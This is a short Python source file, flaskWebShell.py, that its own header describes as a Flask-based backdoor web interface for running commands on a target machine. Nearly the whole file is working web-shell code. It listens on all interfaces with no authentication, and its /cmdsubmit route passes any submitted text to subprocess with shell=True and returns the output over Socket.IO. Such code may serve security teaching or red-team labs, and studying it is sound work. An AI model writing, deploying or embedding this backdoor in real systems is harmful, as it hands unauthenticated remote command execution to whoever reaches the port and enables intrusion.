#-----------------------------------------------------------------------------
# Name:        flaskWebShell.py
#
# Purpose:     This module is a flask web host used to create a web shell script 
#              which can open a backdoor web interface for the user to run command 
#              on the target machine. We also provides an all in one version 
#              <flaskWebShellApp.py> which integrate the  '/templates/index.html' 
#              file in the python program directly. 
#
# Author:      Yuancheng Liu
#
# Version:     v_0.0.1
# Created:     2024/07/03
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
import subprocess
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit # pip install Flask-SocketIO==5.3.5

# The web shell backdoor port
gflaskPort = 5000
app = Flask(__name__)
socketio = SocketIO(app)

@app.route('/')
@app.route('/index')
def index():
    """ route to introduction index page."""
    data = render_template('index.html')
    print(data)
    return data

@app.route('/cmdsubmit', methods=['POST'])
def cmdsubmit():
    """ Run the command the feed back the data to web."""
    cmd = request.form['cmdContents']
    cmd = cmd.strip()
    result = None 
    try:
        result = subprocess.check_output(cmd, shell=True).decode()
    except Exception as err:
        result = str(err)
    socketio.emit('exeResult', {'data': str(result)})
    return 'Command execution finished'

#-----------------------------------------------------------------------------
# socketIO communication handling functions. 
@socketio.event
def connect():
    emit('serv_response', {'data': 'web shell ready'})

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=gflaskPort, debug=False, threaded=True)
